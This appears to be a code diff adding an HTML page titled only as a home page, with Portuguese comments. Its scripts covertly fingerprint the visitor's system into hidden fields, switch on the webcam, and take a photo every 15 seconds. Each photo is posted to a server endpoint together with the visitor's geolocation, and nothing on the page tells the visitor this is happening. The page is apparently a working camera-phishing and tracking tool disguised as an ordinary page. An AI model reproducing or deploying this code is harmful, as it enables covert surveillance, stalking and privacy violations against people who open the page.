@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagina inicial</title>
+</head>
+<body>
+    <input type="hidden" id="os" name="os" readonly><br>
+    <input type="hidden" id="browser" name="browser" readonly><br>
+    <input type="hidden" id="cpu" name="cpu" readonly><br>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('os').value = navigator.platform;
+            document.getElementById('browser').value = navigator.userAgent;
+            document.getElementById('cpu').value = navigator.hardwareConcurrency;
+        });
+    </script>
+    
+    
+
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        let video = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let context = canvas.getContext('2d');
+
+        // Acessar a câmera
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            video.srcObject = stream;
+            video.play();
+            setTimeout(captureImage, 2000);  // Aguarda 2 segundos para a câmera inicializar e capturar a primeira imagem
+        })
+        .catch(function(err) {
+            console.log("Ocorreu um erro: " + err);
+        });
+
+        function captureImage() {
+            context.drawImage(video, 0, 0, 640, 480);
+            let imageData = canvas.toDataURL('image/png');
+
+            // Coletar geolocalização
+            navigator.geolocation.getCurrentPosition(function(position) {
+                let lat = position.coords.latitude;
+                let lon = position.coords.longitude;
+                let geolocation = `Latitude: ${lat}, Longitude: ${lon}`;
+
+                // Enviar imagem e geolocalização para o servidor
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({image: imageData, geolocation: geolocation})
+                });
+
+                setTimeout(captureImage, 15000);  // Captura uma nova imagem a cada 15 segundos
+            });
+        }
+    </script>
+</body>
+</html>
